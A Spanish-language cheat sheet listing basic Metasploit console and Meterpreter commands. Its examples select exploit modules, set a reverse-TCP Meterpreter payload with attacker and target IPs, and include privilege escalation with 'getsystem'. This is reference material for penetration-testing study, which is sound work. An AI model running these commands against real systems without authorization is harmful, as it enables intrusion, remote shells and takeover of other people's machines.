# Metasploit - Comandos básicos

### <mark style="color:yellow;">Tabla de comandos básicos de Metasploit</mark>

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Comando</strong></td><td><strong>Uso</strong></td><td><strong>Ejemplo</strong></td></tr><tr><td><code>use [auxiliary/exploit/payload/encoder/evasion]</code></td><td>Seleccionar un módulo específico</td><td><code>msf> use exploit/unix/ftp/vsftpd_234_backdoor</code></td></tr><tr><td><code>show [exploits/payloads/options/etc.]</code></td><td>Ver lista de módulos disponibles</td><td><code>msf> show payloads</code><br><code>msf> show options</code></td></tr><tr><td><code>set [opción/payload]</code></td><td>Asignar valor a un parámetro específico</td><td><code>msf> set payload windows/meterpreter/reverse_tcp</code><br><code>msf> set LHOST 192.168.10.118</code><br><code>msf> set RHOST 192.168.10.112</code></td></tr><tr><td><code>setg [opción/payload]</code></td><td>Asignar valor global a un parámetro</td><td><code>msf> setg RHOST 192.168.10.112</code></td></tr><tr><td><code>run</code></td><td>Ejecutar un módulo auxiliar</td><td><code>msf> run</code></td></tr><tr><td><code>exploit</code></td><td>Ejecutar un exploit</td><td><code>msf> exploit</code></td></tr><tr><td><code>back</code></td><td>Salir del módulo actual y volver</td><td><code>msf(ms08_067_netapi)> back</code></td></tr><tr><td><code>info</code></td><td>Ver información detallada de un módulo</td><td><code>msf> info exploit/windows/smb/ms08_067_netapi</code></td></tr><tr><td><code>search</code></td><td>Buscar un módulo específico</td><td><code>msf> search hfs</code></td></tr><tr><td><code>check</code></td><td>Verificar si el objetivo es vulnerable</td><td><code>msf> check</code></td></tr><tr><td><code>sessions</code></td><td>Listar sesiones activas</td><td><code>msf> sessions [número]</code></td></tr></tbody></table>

### <mark style="color:yellow;">Comandos básicos de Meterpreter(se verá más adelante)</mark>

| **Comando**             | **Uso**                                      | **Ejemplo**               |
| ----------------------- | -------------------------------------------- | ------------------------- |
| `sysinfo`               | Obtener información del sistema comprometido | `meterpreter> sysinfo`    |
| `ifconfig` / `ipconfig` | Listar interfaces de red                     | `meterpreter> ifconfig`   |
| `arp`                   | Ver IPs y MACs conectadas al objetivo        | `meterpreter> arp`        |
| `background`            | Enviar sesión activa a segundo plano         | `meterpreter> background` |
| `shell`                 | Abrir shell de comandos                      | `meterpreter> shell`      |
| `getuid`                | Obtener nombre de usuario actual             | `meterpreter> getuid`     |
| `getsystem`             | Escalar privilegios a SYSTEM                 | `meterpreter> getsystem`  |
| `getpid`                | Obtener el PID del proceso de Meterpreter    | `meterpreter> getpid`     |
| `ps`                    | Listar todos los procesos activos            | `meterpreter> ps`         |
